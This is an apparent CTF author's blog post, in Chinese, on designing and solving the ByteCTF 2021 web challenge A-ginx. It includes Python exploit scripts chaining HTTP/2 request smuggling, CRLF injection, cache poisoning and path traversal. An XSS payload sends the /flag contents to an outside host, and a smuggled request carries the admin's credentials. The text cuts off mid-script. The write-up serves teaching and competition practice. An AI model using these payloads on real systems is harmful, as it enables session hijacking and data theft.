<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>A-ginx 出题思路与题解 - Kur4ge&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#cee1ff"><meta name="application-name" content="Kur4ge&#039;s Blog"><meta name="msapplication-TileImage" content="https://kur4ge.oss-accelerate.aliyuncs.com/img/icon-192x192.png"><meta name="msapplication-TileColor" content="#cee1ff"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Kur4ge&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="192x192" href="https://kur4ge.oss-accelerate.aliyuncs.com/img/icon-192x192.png"><link rel="apple-touch-icon" sizes="256x256" href="https://kur4ge.oss-accelerate.aliyuncs.com/icon-256x256.png"><link rel="apple-touch-icon" sizes="384x384" href="https://kur4ge.oss-accelerate.aliyuncs.com/icon-384x384.png"><link rel="apple-touch-icon" sizes="512x512" href="https://kur4ge.oss-accelerate.aliyuncs.com/icon-512x512.png"><meta name="description" content="在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀） 这里我来谈谈我出A-ginx的思路。 一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。"><meta property="og:type" content="blog"><meta property="og:title" content="A-ginx 出题思路与题解"><meta property="og:url" content="https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/"><meta property="og:site_name" content="Kur4ge&#039;s Blog"><meta property="og:description" content="在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀） 这里我来谈谈我出A-ginx的思路。 一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://kur4ge.oss-accelerate.aliyuncs.com/img/og_image.png"><meta property="article:published_time" content="2021-12-13T21:37:32.000Z"><meta property="article:modified_time" content="2022-02-10T13:37:32.000Z"><meta property="article:author" content="Kur4ge"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://kur4ge.oss-accelerate.aliyuncs.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/"},"headline":"A-ginx 出题思路与题解","image":["https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131011.gif","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713092.gif","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791763.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791751.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791762.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713093.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713094.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713095.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713096.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713107.png","https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131010.gif"],"datePublished":"2021-12-13T21:37:32.000Z","dateModified":"2022-02-10T13:37:32.000Z","author":{"@type":"Person","name":"Kur4ge"},"publisher":{"@type":"Organization","name":"Kur4ge's Blog","logo":{"@type":"ImageObject","url":"https://kur4ge.oss-accelerate.aliyuncs.com/img/logo.png?no-lazy"}},"description":"在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀） 这里我来谈谈我出A-ginx的思路。 一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。"}</script><link rel="canonical" href="https://blog.kur4ge.com/2021/12/A-ginx-idea-and-writeup/"><link rel="alternate" href="/atom.xml" title="Kur4ge&#039;s Blog" type="application/atom+xml"><link rel="icon" href="https://kur4ge.oss-accelerate.aliyuncs.com/img/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="https://kur4ge.oss-accelerate.aliyuncs.com/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?53d4cc3fbcaf6e6e10265955449fabff";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-6HGV3NEPFY" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-6HGV3NEPFY")</script><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><script>!function(){function e(){if(!location.hash)return;Array.from(document.querySelectorAll(".tab-content")).forEach(e=>{e.classList.add("is-hidden")}),Array.from(document.querySelectorAll(".tabs li")).forEach(e=>{e.classList.remove("is-active")});const e=document.querySelector(location.hash);e&&e.classList.remove("is-hidden");const t=document.querySelector(`a[href="${location.hash}"]`);t&&t.parentElement.classList.add("is-active")}e(),window.addEventListener("hashchange",e,!1)}()</script><meta name="generator" content="Hexo 6.0.0"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/logo.png?no-lazy" alt="Kur4ge&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time datetime="2021-12-13T21:37:32.000Z" title="12/13/2021, 9:37:32 PM">2021-12-14</time>发表</span><span class="level-item"><time datetime="2022-02-10T13:37:32.000Z" title="2/10/2022, 1:37:32 PM">2022-02-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">23 分钟读完 (大约3464个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">A-ginx 出题思路与题解</h1><div class="content"><p>在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀）</p><p>这里我来谈谈我出A-ginx的思路。</p><p>一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。</p><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131011.gif"></p></div><span id="more"></span><h2 id="检查手牌"><a href="#检查手牌" class="headerlink" title="检查手牌"></a>检查手牌</h2><p>那么，就来整理一下，我出题时手上拥有的漏洞点。</p><h3 id="1-HTTP-x2F-2"><a href="#1-HTTP-x2F-2" class="headerlink" title="1. HTTP&#x2F;2"></a>1. HTTP&#x2F;2</h3><p>有些CTFer不喜欢升级手头的工具，总认为v1.7(最早发布于2016年)的Burp Suite才是经典。但是随着Burp不断更新迭代，老版本早因各种原因需要退出历史。比如老版本使用旧的Chromium，随时可能被日; 老版本Burp Suite 就不支持HTTP&#x2F;2 等等</p><p>所以，本题的主体目标就决定为：一定要使用HTTP&#x2F;2，强制使用老版本的CTFer升级Burp Suite。</p><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713091.gif?x-oss-process=style/w200"></p></div><p>当然出题不能无缘无故来使用HTTP&#x2F;2，一定要有什么漏洞点才能加到题目中。通过研读HTTP&#x2F;2的RFC文档，发现协议中并没有可以造成漏洞的问题，但协议没有，使用协议的上下游有没有呢？这篇文章给了我启发<a target="_blank" rel="noopener" href="https://portswigger.net/research/http2">HTTP&#x2F;2: The Sequel is Always Worse</a>，虽然HTTP&#x2F;2协议没有问题，但是在转化为HTTP&#x2F;1.1会产生一些安全风险。</p><p>目前业界也较多采用使用支持HTTP&#x2F;2的反代服务（如Nginx）来做前端的负载均衡，后面通过HTTP&#x2F;1.1进行反向代理到真正的业务服务中。</p><h3 id="2-架构带来的风险"><a href="#2-架构带来的风险" class="headerlink" title="2. 架构带来的风险"></a>2. 架构带来的风险</h3><p>所以整道题目的架构也浮现了：前端(反向代理) –&gt; 后端(业务逻辑)</p><p>那么 这种架构能带来什么安全问题呢?</p><pre><code>a. 请求走私
b. WAF绕过
c. 真实IP欺骗
d. 缓存攻击
</code></pre><h3 id="3-GORM-Where-Key注入"><a href="#3-GORM-Where-Key注入" class="headerlink" title="3. GORM Where Key注入"></a>3. GORM Where Key注入</h3><p>在旧版本中，GORM对于列名的未过滤反引号，可以造成逃逸，从而导致注入。</p><h3 id="4-简简单单来个XSS"><a href="#4-简简单单来个XSS" class="headerlink" title="4. 简简单单来个XSS"></a>4. 简简单单来个XSS</h3><p>前端使是 <a target="_blank" rel="noopener" href="https://github.com/Fungx/Asoul-ICU">Asoul-ICU小作文库</a> 修改而来，原生代码中即存在<code>dangerouslySetInnerHTML</code>的使用，所以简单来说就是一个XSS。</p><h2 id="整理手牌"><a href="#整理手牌" class="headerlink" title="整理手牌"></a>整理手牌</h2><p>这些漏洞点本来是打算出在一道题中，但是发现点太多，最终拆成两道题。（桀桀，牌太多了）</p><p>初赛：请求走私 + 缓存攻击 + XSS</p><p>决赛：请求走私 + GORM注入 + 绕过WAF + 真实IP欺骗</p><blockquote><p>这也是题目描述<code>This is similar to a-ginx, but not very similar!</code>的意义。</p></blockquote><h1 id="题目源码与环境"><a href="#题目源码与环境" class="headerlink" title="题目源码与环境"></a>题目源码与环境</h1><p>题目的源码和环境现已全部开源，欢迎大家指教～</p><ul><li><p><a target="_blank" rel="noopener" href="https://github.com/kur4ge/my-ctf-challenges/tree/main/ByteCTF2021/A-ginx">A-ginx 源码与环境</a></p></li><li><p><a target="_blank" rel="noopener" href="https://github.com/kur4ge/my-ctf-challenges/tree/main/ByteCTF2021/A-ginx2">A-ginx2 源码与环境</a></p></li></ul><div align="center"><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713092.gif"></p></div><h1 id="解题思路和EXP"><a href="#解题思路和EXP" class="headerlink" title="解题思路和EXP"></a>解题思路和EXP</h1><p>初赛提供了环境，二进制程序，数据库结构。这大部分都和A-ginx2是相似的。</p><h2 id="通用的设定"><a href="#通用的设定" class="headerlink" title="通用的设定"></a>通用的设定</h2><h3 id="Trace-Id"><a href="#Trace-Id" class="headerlink" title="Trace-Id"></a>Trace-Id</h3><p>包括现实很多地方都会存在类似于<code>Trace-Id</code> 的东西，它们只有一个目的，追踪请求的流转。在本题中，你可以通过<code>Trace-Id</code> 来判断这个请求是否到达到<code>backend</code>。</p><h2 id="A-ginx"><a href="#A-ginx" class="headerlink" title="A-ginx"></a>A-ginx</h2><p><a target="_blank" rel="noopener" href="https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#rDVUaU">2021 ByteCTF 初赛部分题目官方Writeup</a></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>既然提供了bot,那必然有XSS。不管通过那些途径，你可以找到两个XSS点</p><ol><li><p>POST型XSS点 <code>/v/articles/preview</code></p></li><li><p>展示article中的 <code>htmlContent</code> 是另一个XSS点</p></li></ol><p>但是这两个点都不能独立的完成XSS，一个是POST型无法触发，另一个因为输入中有<code>HTMLSanitize</code>来进行过滤。</p><h3 id="缓存服务"><a href="#缓存服务" class="headerlink" title="缓存服务"></a>缓存服务</h3><p>观察各个API，你会发现在<code>/static/</code> 下的请求，会进行缓存，并出现<code>cache-key</code>。这个请求头没有<code>Trace-Id</code>，也表示它是直接的被缓存在了A-ginx端中。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791763.png"></p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><ol><li>400 Bad Request</li></ol><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791751.png"></p><p>携带<code>Trace-Id</code> 说明该请求为后端返回的。</p><ol start="2"><li>500 Internal Server Error</li></ol><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/loading.gif" data-original="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394066791762.png"></p><p>未携带<code>Trace-Id</code> ，说明这个500是A-ginx出错造成的。根本原因是因为错误的请求包，导致后端断开了和前端的TCP请求，第二次访问的时候连接已经断开，导致500。</p><h3 id="确认基本攻击思路"><a href="#确认基本攻击思路" class="headerlink" title="确认基本攻击思路"></a>确认基本攻击思路</h3><p>这样我们就大致确定了攻击思路，通过CRLF注入把带有XSS payload的JSON写入A-ginx的&#x2F;static&#x2F;下的cache中。之后通过目录穿越，让<code>/v/articles/uuid</code> 转变为获取 <code>/static/kur4ge1337.json</code>来触发XSS。</p><h3 id="写入恶意json"><a href="#写入恶意json" class="headerlink" title="写入恶意json"></a>写入恶意json</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:20443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">payload1 = parse.quote(<span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /v/articles/preview HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 418</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">title=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span> + payload1)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br></pre></td></tr></table></figure><p>通过上面的Payload，我们可以写入任意数据到&#x2F;static&#x2F;下，但是新的问题出现了。</p><h3 id="Flag的获取"><a href="#Flag的获取" class="headerlink" title="Flag的获取"></a>Flag的获取</h3><p><code>/flag</code>要求管理员凭据，但是我们的管理员凭据只会在请求 <code>/v/articles/uuid</code> 时发送，那么，即使我们获得了XSS，也没有办法获得管理员凭据（非预期的方案不算…）</p><p>这里就要提一个点，fetch 会自动跟随302跳转。而带有<code>../</code>的路径又会触发302跳转。那么有没办法通过CRLF注入，把管理员凭证的利用点向后移动呢？</p><p>当然可以，构造Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%25252f..%25252fstatic%252fKur4ge1337.json%2520HTTP%252f1<span class="number">.1</span>%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%<span class="number">2520</span>%252fflag</span><br></pre></td></tr></table></figure><p>Admin Location跳转后，会提取<code>/#/articles/</code> 后的内容，向<code>Aginx</code>发送请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /v/articles/..%<span class="number">25252</span>f..%<span class="number">25252</span>fstatic%<span class="number">252</span>fKur4ge1337.json%<span class="number">2520</span>HTTP%<span class="number">252</span>f1.<span class="number">1</span>%<span class="number">250</span>aHost:%<span class="number">2520</span>localhost%<span class="number">250</span>aConnection:%<span class="number">2520</span>Keep-Alive%<span class="number">250</span>a%<span class="number">250</span>aGET%<span class="number">2520</span>%<span class="number">252</span>fflag HTTP/<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Authoration</span>：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Aginx 接收到请求，转发给<code>web</code> 请求如下，</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/v/</span>articles<span class="regexp">/..%2f..%2fstatic/</span>Kur4ge1337.json HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="attr">Host:</span> localhost</span><br><span class="line"><span class="attr">Connection:</span> Keep-Alive</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/flag HTTP/</span><span class="number">1.1</span></span><br><span class="line">Authoration：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>web</code> 发现存在<code>..%2f</code> 返回301跳转，这里也走私了一个<code>/flag</code> (5行之后)请求，并且携带了Admin的凭证</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">301</span></span><br><span class="line"><span class="attribute">Location</span>: /static/Kur4ge1337.json</span><br></pre></td></tr></table></figure><p><code>fetch</code>发现存在301跳转，会自动跟随<code>Location</code> 发起第二轮请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /static/Kur4ge1337.json HTTP/2.0</span><br><span class="line">Authoration：Bearer ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这个请求已经被<code>Cache</code>，就在<code>Aginx</code>端直接进行了拦截返回，即这个请求是不会发送到<code>Web</code> 即不会获取到走私的<code>/flag</code></p><p>可以在页面中成功触发XSS，通过<code>onerror</code>来发起<code>/flag</code> 请求，来读取到之前走私的<code>/flag</code>。</p><p>问题解决~</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">DOMAIN = <span class="string">&#x27;127.0.0.1:20443&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">payload1 = parse.quote(<span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /v/articles/preview HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;DOMAIN&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 418</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">title=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">    <span class="comment"># data = &#123;&#x27;title&#x27;: &#x27;test&#x27;, &#x27;content&#x27;: &#x27;&lt;p&gt;&lt;/p&gt;&#x27;&#125;</span></span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/v/&#x27;</span> + payload1)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    r = client.get(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;https://<span class="subst">&#123;DOMAIN&#125;</span>/static/Kur4ge1337.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, r.headers.raw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encodeURI</span>(<span class="params">s</span>):</span><br><span class="line">    r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;&#x27;&#x27;\r\n&quot;&#x27;%&amp;/ &#x27;&#x27;&#x27;</span>:</span><br><span class="line">            r +=  <span class="string">&#x27;%&#123;:0&gt;2x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r += c</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = encodeURI(encodeURI(<span class="string">f&#x27;&#x27;&#x27;..%2f..%2fstatic/Kur4ge1337.json HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">Connection: Keep-Alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag&#x27;&#x27;&#x27;</span>.strip()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">suffix = io.recvuntil(<span class="string">b&#x27;)&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = io.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(suffix) == <span class="number">16</span> <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">hash</span>) == <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">suffix, <span class="built_in">hash</span></span>):</span><br><span class="line">    chars = string.digits + string.ascii_letters</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> 